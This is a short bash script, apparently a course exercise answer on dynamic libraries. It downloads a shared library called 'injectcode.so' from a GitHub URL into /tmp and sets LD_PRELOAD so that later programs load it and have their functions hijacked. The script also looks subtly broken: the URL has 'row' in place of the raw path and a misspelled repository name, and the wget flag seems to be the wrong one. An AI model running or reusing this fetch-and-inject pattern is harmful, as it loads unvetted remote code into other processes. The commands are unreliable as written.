#!/bin/bash
wget -p /tmp https://github.com/binikiya/alx-low_level_prgramming/row/main/0x18-dynamic_libraries/injectcode.so
export LD_PRELOAD=/tmp/injectcode.so
